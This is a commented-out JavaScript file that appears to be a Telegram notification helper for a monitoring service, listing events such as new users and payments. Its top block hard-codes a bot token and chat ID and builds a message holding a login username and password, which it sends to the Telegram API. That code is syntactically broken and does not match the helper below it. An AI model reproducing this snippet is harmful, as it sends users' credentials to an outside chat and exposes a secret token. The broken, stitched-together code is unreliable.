// const TelegramBot = require('node-telegram-bot-api');

// const token = '5387501482:AAEMW6_Lm-VZ3jjqrnaJWZrA7emnpHTBZSU';
// const chatId = -649421209;
// const username = windows;
// const password = PASSWORD_REFERENCE_FROM_LOGIN;
// var text_send = '"username":"${username}","password":"${password}"';

// const bot = new TelegramBot(token, { polling: false });
// const url = 'https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text=${text_send}';

// let api = new XMLHttpRequest();
// api.open("GET",url,true);
// api.send();

// console.log("Message sent successfully!");



// const telegrambot = (message, json) => {
//   try {
//     bot.sendMessage(chatId, message + '\n\n<pre>' + JSON.stringify(json, null, 2) + '</pre>', {
//       parse_mode: 'html'
//     });
//   } catch (err) {
//     console.log('Something went wrong when trying to send a Telegram notification', err);
//   }
// }

// const ACTIONS = {
//   NEW_USER: '🙋‍♂️new user',
//   NEW_MONITOR: '🖥 new monitor',
//   LATENCY: '👨‍💻 somebody has used the latency tool',
//   NEW_STATUS_PAGE: '📈 new status page',
//   NEW_SUBSCRIPTION: '💰💰💰 a user has subscribed!',
//   NEW_PAYMENT: '🤑 a payment has processed',
//   WEEKLY_REPORTS_SENDING: '✴️ Weekly reports are being sent',
//   WEEKLY_REPORTS_SENT: '✅ Weekly reports have been sent',
//   END_TRIAL_USERS: '✋ end of trial users today',
//   TRIAL_USERS_SOON_END: '👀 users that end their trials in 3 days',
// }

// module.exports = {
//   telegrambot,
//   ACTIONS
// }
